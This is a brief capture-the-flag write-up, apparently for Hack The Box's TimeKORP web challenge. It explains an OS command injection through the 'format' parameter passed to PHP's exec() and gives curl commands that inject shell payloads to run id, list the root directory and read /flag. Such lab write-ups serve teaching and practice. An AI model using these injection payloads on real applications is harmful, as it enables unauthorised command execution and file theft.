# TimeKORP — OS Command Injection

## 📌 CTF Overview

- **Category:** Web
- **Vulnerability:** OS Command Injection
- **Parameter:** `format`

## 🎯 Objective

Identify and exploit an OS command injection vulnerability in the TimeKORP web application to retrieve the CTF flag.

## 🔍 What Is Happening?

The application uses PHP's `exec()` to execute a system command. The `format` parameter is passed into the command without proper protection, potentially allowing user input to execute unintended shell commands.

## 💻 Solution — Terminal Commands

### 1. Set the Target URL

```bash
export TARGET='http://TARGET_HOST:TARGET_PORT'
```

Stores the target URL in an environment variable for reuse in subsequent commands.

### 2. Test Command Injection and Read the Flag

```bash
curl -sG "$TARGET/" --data-urlencode "format='; cat /flag; #"
```

Sends a crafted GET request that attempts to inject a shell command and read the flag from `/flag`.

### 3. Investigate the Execution Context

```bash
curl -sG "$TARGET/" --data-urlencode "format='; id; ls -la /; cat /flag; #"
```

Attempts to identify the execution context, list the root directory, and retrieve the flag.

### 4. Extract the Flag

```bash
curl -sG "$TARGET/" --data-urlencode "format='; cat /flag; #" | grep -oE 'HTB\{[^}]+\}'
```

Filters the response to display text matching the expected `HTB{...}` flag format.

